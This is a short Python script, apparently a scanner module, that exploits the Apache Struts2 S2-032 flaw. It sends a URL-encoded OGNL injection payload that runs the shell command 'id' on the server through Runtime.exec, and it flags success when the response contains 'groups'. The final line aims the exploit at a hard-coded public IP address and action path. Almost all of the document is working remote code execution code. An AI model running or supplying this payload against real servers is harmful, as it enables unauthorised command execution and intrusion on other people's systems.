import requests
# url是action或者do
class struts2_032:
    def __init__(self, url):
        self.url = url

    def attack(self):
        print('test {} --> struts2_032'.format(self.url))
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        exp = '''?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=id'''
        self.url += exp
        try:
            resp = requests.get(self.url, headers=headers, timeout=10)
            if "groups" in resp.text:
                return "s2-032"
        except:
            #print('test --> struts2_032 Failed!')
            return None
        return None
print(struts2_032('http://45.77.123.178//memoindex.action').attack())